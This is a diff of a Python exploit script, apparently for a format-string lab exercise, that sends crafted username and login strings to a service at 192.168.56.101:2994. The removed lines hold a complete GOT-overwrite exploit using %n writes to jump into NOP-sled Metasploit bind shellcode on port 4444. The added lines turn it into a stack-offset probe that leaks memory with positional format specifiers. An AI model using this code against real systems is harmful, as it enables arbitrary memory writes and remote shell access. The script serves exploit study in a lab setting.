@@ -1,16 +1,26 @@
 import socket
 import sys
 
+"""
+This program is used for searching the offset from the start position of the internal stack pointer to the dummy string represented
+as "BBBBCCCCDDDDEEEE" which is part of the format string and located on the  stack.
+Those values are placeholders for bytes representing the addresses of 4 bytes the user wants to write to. 
+
+argv[1] - starting point on the stack
+argv[2] - how many places to show after the starting point
+argv[3] - custom padding for alignment adjustment
+"""
+
 def main():
 
 	HOST = '192.168.56.101'
 	PORT = 2994
 
-	# puts GOT entry (addresses of 4 consecutive bytes)
-	puts_GOT_1 = "\x94\xa1\x04\x08"
-	puts_GOT_2 = "\x95\xa1\x04\x08"
-	puts_GOT_3 = "\x96\xa1\x04\x08"
-	puts_GOT_4 = "\x97\xa1\x04\x08"
+	# dummy values for stack locating and alignment adjusting
+	byte_address_1 = "BBBB"
+	byte_address_2 = "CCCC"
+	byte_address_3 = "DDDD"
+	byte_address_4 = "EEEE"
 
 
 	# Metasploit TCP bind shellcode at port 4444 prepended with NOP-sled
@@ -31,20 +41,19 @@ def main():
 	username = shellcode + "\n"
 
 	# Prepended with "AAAAAAA" for memory alignment
-	login = "AAAAAAA" + puts_GOT_1 + puts_GOT_2 + puts_GOT_3 + puts_GOT_4
-	
-	# Tailoring format string to write "\x28\xfa\xff\xbf" bytes to puts GOT entry 
-	newlen = 0x0428 - len(format_str) - len(username) - len(login) + 0x2
-	login += "%" + str(newlen) + "x" + "%47$n"
-	newlen = 0x04fa - 0x428
-	login += "%" + str(newlen) + "x" + "%48$n"
-	newlen = 0x05ff - 0x04fa
-	login += "%" + str(newlen) + "x" + "%49$n"
-	newlen = 0x06bf - 0x05ff
-	login += "%" + str(newlen) + "x" + "%50$n"
+	login = "A" * int(sys.argv[3]) + byte_address_1 + byte_address_2 + byte_address_3 + byte_address_4
 
+	j = int(sys.argv[1])
+	for i in range(int(sys.argv[2])):
+		login += ".%" + str(j) + "$08x"
+		j += 1
+
+	login += "\n"
+
+	print(login)
 
 	sock.send("username " + username)
+	print(sock.recv(1024))
 	sock.send("login " + login)
 	print(sock.recv(1024))
 	sock.close()
